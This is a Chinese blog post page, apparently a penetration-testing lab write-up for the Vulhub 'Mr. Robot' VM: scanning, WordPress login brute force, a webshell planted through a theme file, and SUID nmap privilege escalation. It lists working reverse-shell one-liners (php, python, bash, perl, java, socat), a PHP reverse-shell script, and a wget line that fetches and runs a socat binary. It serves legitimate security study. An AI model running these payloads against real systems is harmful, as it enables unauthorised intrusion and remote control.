@@ -1,0 +1,551 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/icon.jpg">
+  <link rel="icon" href="/img/icon.jpg">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="pepper">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="Vulhub靶场学习路线-全纪录">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Vulhub-Mr.Robot">
+<meta property="og:url" content="http://example.com/2022/03/29/vulhub-Mr.robot/index.html">
+<meta property="og:site_name" content="Pepper&#39;s home">
+<meta property="og:description" content="Vulhub靶场学习路线-全纪录">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/Little-pepper/images/微信图片_20220408161044.jpg">
+<meta property="article:published_time" content="2022-03-29T08:07:53.000Z">
+<meta property="article:modified_time" content="2022-04-11T10:00:26.194Z">
+<meta property="article:author" content="pepper">
+<meta property="article:tag" content="靶场练习">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/Little-pepper/images/微信图片_20220408161044.jpg">
+  
+  
+  <title>Vulhub-Mr.Robot - Pepper&#39;s home</title>
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4/github-markdown.min.css" />
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hint.css@2/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10/styles/agate.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3/dist/jquery.fancybox.min.css" />
+  
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.8.14","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 6.1.0"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Pepper’s home</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                文章
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
+            </a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner" id="banner" parallax=true
+         style="background: url('/img/window.jpg') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="Vulhub-Mr.Robot">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2022-03-29 16:07" pubdate>
+        2022年3月29日 下午
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      5k 字
+    </span>
+  
+
+  
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      42 分钟
+    </span>
+  
+
+  
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">Vulhub-Mr.Robot</h1>
+            
+            <div class="markdown-body">
+              <h3 id="1-写在前面"><a href="#1-写在前面" class="headerlink" title="1.写在前面"></a>1.写在前面</h3><blockquote>
+<p>计划按照OSCP的学习路线，从头开始学习并复现Vulhub的靶场环境，在此进行记录</p>
+<p>Mr.robot其实是个美剧，之前看过一些，算是脑洞大开的一类，除此之外还有 《硅谷》，都是比较出众的IT类型影视剧。</p>
+</blockquote>
+<h3 id="2-知识点速记"><a href="#2-知识点速记" class="headerlink" title="2.知识点速记"></a>2.知识点速记</h3><ul>
+<li>目录及登录爆破</li>
+<li>wordpress后台getshell</li>
+<li>Linux下shell反弹</li>
+<li>普通shell及交互式shell</li>
+<li>suid提权</li>
+<li>基础Linux知识</li>
+</ul>
+<hr>
+<h3 id="3-环境配置"><a href="#3-环境配置" class="headerlink" title="3.环境配置"></a>3.环境配置</h3><p>直接去Vulhub官网下载对应的ova文件即可，然后拖入vmware。这里为了方便宿主机与靶机通讯，将虚拟机的网络模式设置为了<strong>NAT</strong>模式</p>
+<p>Win10 宿主机、kali2020 攻击机、vulhub靶机 </p>
+<h3 id="4-信息收集"><a href="#4-信息收集" class="headerlink" title="4.信息收集"></a>4.信息收集</h3><p>环境配置好后，首先确认一下IP，在kali上查看当前IP为 192.168.114.128</p>
+<p>对当前网段的主机进行扫描，可使用的命令如下：</p>
+<figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">nmap</span> -R <span class="hljs-number">192.168.114.0</span>/<span class="hljs-number">24</span><br><span class="hljs-attribute">arp</span>-scan <span class="hljs-number">192.168.114.0</span>/<span class="hljs-number">24</span> (同个网段，内网嗅探)<br></code></pre></div></td></tr></table></figure>
+
+<img src="https://cdn.jsdelivr.net/gh/Little-pepper/images/image-20220408165133607.png" srcset="/img/loading.gif" lazyload alt="image-20220408165133607" style="zoom:80%;" />
+
+<img src="https://cdn.jsdelivr.net/gh/Little-pepper/images/image-20220408165230171.png" srcset="/img/loading.gif" lazyload alt="image-20220408165230171" style="zoom:67%;" />
+
+<p>找到目标靶机并确认开启了80，443端口。</p>
+<h3 id="5-目录扫描"><a href="#5-目录扫描" class="headerlink" title="5.目录扫描"></a>5.目录扫描</h3><p>访问网站，是一个虚拟终端的动画展示（无法执行命令）。除此外没有得到其他有用信息，也无链接可以跳转。</p>
+<p>于是尝试进行目录爆破，使用工具kali下的<code>gobuster</code></p>
+<p><code>gobuster dir -w /home/wanghao/vulhub/Dir.txt  -u http://192.168.114.129 -t 20 -o test.txt</code></p>
+<img src="https://cdn.jsdelivr.net/gh/Little-pepper/images/%E4%BC%81%E4%B8%9A%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_1648873626300.png" srcset="/img/loading.gif" lazyload alt="img" style="zoom:80%;" />
+
+<p>当然方式有很多，Kali下还有自带的<code>dirb</code> <code>dirb https://192.168.114.129/  </code></p>
+<img src="https://cdn.jsdelivr.net/gh/Little-pepper/images/image-20220408170348142.png" srcset="/img/loading.gif" lazyload alt="image-20220408170348142" style="zoom:67%;" />
+
+<p>访问 &#x2F;login 跳转到<strong>wordpress登录界面</strong>，抓包测试明文传输，但目前没有密码</p>
+<p>访问 robots.txt ，发现俩文件 <code>fsocity.dic</code> 和 <code>key-1-of-3.txt</code> （就这样第1个key就拿到了，一共3个key）</p>
+<img src="https://cdn.jsdelivr.net/gh/Little-pepper/images/image-20220408171824092.png" srcset="/img/loading.gif" lazyload alt="image-20220408171824092" style="zoom:67%;" />
+
+<h3 id="6-用户爆破"><a href="#6-用户爆破" class="headerlink" title="6.用户爆破"></a>6.用户爆破</h3><p>下载这个 <code>fsocity.dic</code> 文件，发现是个字典，结合上面wordpress登录，可以进行一波<strong>用户爆破</strong>。</p>
+<p>PS：这里有个技巧，如果输入的用户不存在，会进行错误提示，那么可以先爆破用户名，然后利用争取的用户名爆破密码，提高跑字典的效率！</p>
+<img src="https://cdn.jsdelivr.net/gh/Little-pepper/images/image-20220408172302420.png" srcset="/img/loading.gif" lazyload alt="image-20220408172302420" style="zoom: 67%;" />
+
+<p>具体怎么跑就不说了，丢到burp的intruder模块就完事了。用的就是上面的dic字典，这里成功跑出用户ElLiot和elliot。（其实就是电视剧男主的名字….）</p>
+<img src="https://cdn.jsdelivr.net/gh/Little-pepper/images/%E4%BC%81%E4%B8%9A%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_16488815633679.png" srcset="/img/loading.gif" lazyload alt="img" style="zoom:67%;" />
+
+<p>OK，接着跑密码，这里其实看过其他人写的wp，所以知道密码也在这个dic文件中，但看了看这个dic量是在太大，密码也放在文件的最后几行里，如果是真实环境，我可能已经放弃了….  最后得到账号密码：<code>Elliot ER28-0652</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Little-pepper/images/image-20220408172802161.png" srcset="/img/loading.gif" lazyload alt="image-20220408172802161"></p>
+<h3 id="7-反弹shell"><a href="#7-反弹shell" class="headerlink" title="7.反弹shell"></a>7.反弹shell</h3><blockquote>
+<p>这里走了比较多的弯路，后面对linux下反弹shell进行一波总结</p>
+</blockquote>
+<p>利用上面的账号密码登录wordpress后台，寻找可getshell的地方。中间为了复现，把环境打崩了。。。</p>
+<p>后面的复现中靶机的IP变更为 <code>192.168.114.130</code></p>
+<h4 id="修改主题文件"><a href="#修改主题文件" class="headerlink" title="修改主题文件"></a>修改主题文件</h4><p>通过修改主题文件，实现getshell。需要注意的是，要明确主题文件的<strong>相对路径</strong>，这里插入了一个echo语句，进行测试，实际上404文件在这：<code>https://192.168.114.130/wp-content/themes/twentyfifteen/404.php</code>，也即<code>路径/wp-content/themes/主题名称/主题文件</code></p>
+<blockquote>
+<p>后台getshell方式：<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_54430466/article/details/115298349">wordpress后台getshell</a></p>
+</blockquote>
+<p><img src="https://cdn.jsdelivr.net/gh/Little-pepper/images/image-20220408183435079.png" srcset="/img/loading.gif" lazyload alt="image-20220408183435079"></p>
+<p>对于本次环境，利用方式有很多：</p>
+<h4 id="借助webshell"><a href="#借助webshell" class="headerlink" title="借助webshell"></a>借助webshell</h4><blockquote>
+<ol>
+<li><p>插入一句话webshell，然后用<strong>蚁剑</strong>或<strong>哥斯拉</strong>连接后得到一个简易的终端</p>
+</li>
+<li><p>然后检测目标服务器的语言环境和安装的程序，再选择对应的反弹shell的payload</p>
+<ol>
+<li>语言环境：php、python、perl、ruby、java</li>
+<li>应用：nc、socat、bash、zsh、openssl</li>
+</ol>
+</li>
+</ol>
+<figure class="highlight sh"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs sh"><span class="hljs-comment">## php反弹shell</span><br>php -r <span class="hljs-string">&#x27;$sock=fsockopen(&quot;攻击者ip&quot;,端口);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#x27;</span><br><br><span class="hljs-comment">## python反弹shell</span><br>python -c <span class="hljs-string">&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.114.128&quot;,9999));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;</span><br><br><span class="hljs-comment">## bash反弹shell </span><br>bash -i &gt;&amp; /dev/tcp/攻击ip/攻击端口 0&gt;&amp;1<br><br><span class="hljs-comment">## perl反弹shell</span><br>perl -e <span class="hljs-string">&#x27;use Socket;$i=&quot;攻击者ip&quot;;$p=8080;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;&#x27;</span><br><br><span class="hljs-comment">## java反弹shell</span><br><span class="hljs-comment">## 需要编译再运行</span><br>r = Runtime.getRuntime()<br>p = r.exec([<span class="hljs-string">&quot;/bin/bash&quot;</span>,<span class="hljs-string">&quot;-c&quot;</span>,<span class="hljs-string">&quot;exec 5&lt;&gt;/dev/tcp/攻击者ip/端口;cat &lt;&amp;5 | while read line; do <span class="hljs-variable">$line</span> 2&gt;&amp;5 &gt;&amp;5; done&quot;</span>] as String[])<br>p.waitFor()<br><br><span class="hljs-comment">## msfvenom生成各类shell</span><br>msfvenom -l payload |grep <span class="hljs-string">&quot;cmd/unix&quot;</span><br>msfvenom -p <span class="hljs-string">&quot;对应的payload&quot;</span> -LHOST xxx -LPORT xxx R<br></code></pre></div></td></tr></table></figure>
+</blockquote>
+<h4 id="直接反弹"><a href="#直接反弹" class="headerlink" title="直接反弹"></a>直接反弹</h4><blockquote>
+<p>直接编辑主题的php文件，然后插入shell反弹语句 (fsockopen函数)</p>
+<figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-comment"># php 反弹</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">set_time_limit</span>(<span class="hljs-number">0</span>);<br><span class="hljs-variable">$ip</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;ip&#x27;</span>];<br><span class="hljs-variable">$port</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;port&#x27;</span>];<br><span class="hljs-variable">$fp</span>=@<span class="hljs-title function_ invoke__">fsockopen</span>(<span class="hljs-variable">$ip</span>,<span class="hljs-variable">$port</span>,<span class="hljs-variable">$errno</span>,<span class="hljs-variable">$errstr</span>);<br><span class="hljs-keyword">if</span>(!<span class="hljs-variable">$fp</span>)&#123; <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;error&quot;</span>;&#125;<br><span class="hljs-keyword">else</span>&#123;<br><span class="hljs-title function_ invoke__">fputs</span>(<span class="hljs-variable">$fp</span>,<span class="hljs-string">&quot;\n++++++++++connect success++++++++\n&quot;</span>);<br><span class="hljs-keyword">while</span> (!<span class="hljs-title function_ invoke__">feof</span>(<span class="hljs-variable">$fp</span>)) &#123;<br><span class="hljs-title function_ invoke__">fputs</span>(<span class="hljs-variable">$fp</span>,<span class="hljs-string">&quot;[php-shell]:&quot;</span>);<span class="hljs-comment">//输出</span><br><span class="hljs-variable">$shell</span>=<span class="hljs-title function_ invoke__">fgets</span>(<span class="hljs-variable">$fp</span>);<br><span class="hljs-variable">$message</span>=`<span class="hljs-variable">$shell</span>`;<br><span class="hljs-title function_ invoke__">fputs</span>(<span class="hljs-variable">$fp</span>,<span class="hljs-variable">$message</span>);<br>&#125;<br><span class="hljs-title function_ invoke__">fclose</span>(<span class="hljs-variable">$fp</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></div></td></tr></table></figure>
+
+<p>由于oscp是kali环境的，所以payload最好也在kali里找，这里可以用wordpress的这个：</p>
+<figure class="highlight sh"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs sh">find / -name php-reverse-shell.php<br></code></pre></div></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/Little-pepper/images/image-20220411175756889.png" srcset="/img/loading.gif" lazyload alt="image-20220411175756889"></p>
+</blockquote>
+<blockquote>
+<p>相关链接：</p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/0day-li/p/13595210.html">Linux 反弹shell</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.sohu.com/a/401137476_783648">不一样的 “反弹Shell” 系统剖析 </a></p>
+</blockquote>
+<h4 id="提升交互式shell"><a href="#提升交互式shell" class="headerlink" title="提升交互式shell"></a>提升交互式shell</h4><p>但这里有个问题，kali监听得到的本地shell，交互性较差，具体表现在：</p>
+<ol>
+<li>没有错误输出</li>
+<li><strong>无法执行su、ssh等命令</strong></li>
+<li>没有向上的历史箭头</li>
+<li>无法使用vim等</li>
+<li>ctrl+z 断开shell连接</li>
+</ol>
+<p><img src="https://cdn.jsdelivr.net/gh/Little-pepper/images/image-20220411175239671.png" srcset="/img/loading.gif" lazyload alt="image-20220411175239671"></p>
+<p>以上最要命的是无法执行su切换用户，因为后面的任务需要提权到robot用户、root用户，所以必须要搞个交互式的shell。</p>
+<p>目前学习到的主要两个：</p>
+<figure class="highlight sh"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs sh"><span class="hljs-comment">## python TTY交互式shell</span><br><span class="hljs-comment">## 对于已经安装了python的系统，我们可以使用python提供的pty模块，只需要一行脚本就可以创建一个原生的终端</span><br>python -c <span class="hljs-string">&#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></code></pre></div></td></tr></table></figure>
+
+<figure class="highlight sh"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs sh"><span class="hljs-comment">## socat 全交互式shell（自动补全、历史箭头、su、vim、ctrl+z返回终端）</span><br><span class="hljs-comment">### https://github.com/andrew-d/static-binaries/tree/master/socat/build.sh</span><br><span class="hljs-comment">## 靶机命令</span><br>socat <span class="hljs-built_in">exec</span>:<span class="hljs-string">&#x27;bash -li&#x27;</span>,pty,stderr,setsid,sigint,sane tcp:攻击机ip:攻击机端口<br><span class="hljs-comment">## 攻击机命令</span><br>socat file:`<span class="hljs-built_in">tty</span>`,raw,<span class="hljs-built_in">echo</span>=0 tcp-listen:攻击机端口<br><span class="hljs-comment">### wget 一行命令socat</span><br>wget -q https://xxx.com/socat -O /tmp/socat; <span class="hljs-built_in">chmod</span> +x /tmp/socat; /tmp/socat <span class="hljs-built_in">exec</span>:<span class="hljs-string">&#x27;bash -li&#x27;</span>,pty,stderr,setsid,sigint,sane tcp:127.0.0.1:8080<br></code></pre></div></td></tr></table></figure>
+
+<p><strong>tips</strong>：一般linux并没有安装socat，可以先下载到vps上，然后在靶机上通过wget的方式下载再本地运行</p>
+<blockquote>
+<p>相关链接：<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_30522983/article/details/116941725">Linux完全交互式的TTY</a></p>
+</blockquote>
+<h3 id="8-提权"><a href="#8-提权" class="headerlink" title="8.提权"></a>8.提权</h3><h4 id="8-1-su切换"><a href="#8-1-su切换" class="headerlink" title="8.1 su切换"></a>8.1 su切换</h4><p>完成交互式shell建立后，先进入<code>/home/robot</code> 查看，发现第二个key和一个md5加密的密码</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Little-pepper/images/image-20220411160309193.png" srcset="/img/loading.gif" lazyload alt="image-20220411160309193"></p>
+<p>对密码进行破解，得到用户<code>robot/abcdefghijklmnopqrstuvwxyz</code>，至于为什么是robot用户？除了home下用户名外，也可以看看<code>etc/passwd</code>文件。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Little-pepper/images/image-20220411160512807.png" srcset="/img/loading.gif" lazyload alt="image-20220411160512807"></p>
+<p>于是切换到robot用户。还记得之前的key-2吗，用daemon权限是读取不到的，只有owner，也即robot用户才有权读取。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Little-pepper/images/image-20220411161341570.png" srcset="/img/loading.gif" lazyload alt="image-20220411161341570"></p>
+<h4 id="8-2-suid提权"><a href="#8-2-suid提权" class="headerlink" title="8.2 suid提权"></a>8.2 suid提权</h4><p>这里用到了suid提权，这个之前总结过，后面把那篇也更新到博客里。</p>
+<p>简单来说，Linux中已知可用来提权的可执行文件有：</p>
+<figure class="highlight dos"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs dos">Nmap、Vim、<span class="hljs-built_in">find</span><br>Bash、<span class="hljs-built_in">More</span>、Less<br>Nano、cp<br></code></pre></div></td></tr></table></figure>
+
+<p>以下命令用于发现系统上运行的SUID可执行文件。命令将尝试<strong>查找具有root权限的SUID的文件</strong>。</p>
+<figure class="highlight sh"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs sh">find / -user root -perm -4000 2&gt;/dev/null<br>find / -perm -u=s -<span class="hljs-built_in">type</span> f 2&gt;/dev/null<br>find / -user root -perm -4000 -<span class="hljs-built_in">exec</span> <span class="hljs-built_in">ls</span> -ldb &#123;&#125; \;<br><br><span class="hljs-comment">##解释一下find 命令的参数：</span><br>1.-perm (permission)，匹配权限。<br>4000 2000 1000分别表示SUID SGID SBIT<br>2为标准错误 /dev/null为黑洞设备（收到的信息全部丢弃）<br>3.-<span class="hljs-built_in">exec</span> <span class="hljs-built_in">command</span> &#123;&#125; \;  对find匹配到的文件执行<span class="hljs-built_in">command</span>命令<br>&#123;&#125;表示由find找到的内容，都会被放到&#123;&#125;中<br>即执行<span class="hljs-built_in">ls</span> -ldb命令<br></code></pre></div></td></tr></table></figure>
+
+<p>用上述命令搜索，发现存在nmap程序，且属主为root，具有s标志位。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Little-pepper/images/%E4%BC%81%E4%B8%9A%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_16494044146487.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<blockquote>
+<p>较旧版本的Nmap（2.02至5.21）带有交互模式，从而允许用户执行shell命令。由于Nmap位于上面使用root权限执行的二进制文件列表中，因此可以使用交互式控制台来运行具有相同权限的shell。</p>
+</blockquote>
+<p>那么我们查看下nmap版本，确实在范围内，那直接利用了呀</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Little-pepper/images/%E4%BC%81%E4%B8%9A%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_16494050907059.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>切到root目录，第三个key得到，打完收工</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Little-pepper/images/image-20220411164117028.png" srcset="/img/loading.gif" lazyload alt="image-20220411164117028"></p>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                  <div class="post-meta mr-3">
+                    <i class="iconfont icon-category"></i>
+                    
+                      <a class="hover-with-bg" href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a>
+                    
+                      <a class="hover-with-bg" href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/Vulhub%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/">Vulhub靶场练习</a>
+                    
+                  </div>
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/">靶场练习</a>
+                    
+                  </div>
+                
+              </div>
+              
+              
+                <div class="post-prevnext">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2022/03/26/SSTI/">
+                        <span class="hidden-mobile">SSTI</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+  </div>
+  
+
+  
+
+  
+</footer>
+
+
+  <!-- SCRIPTS -->
+  
+  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
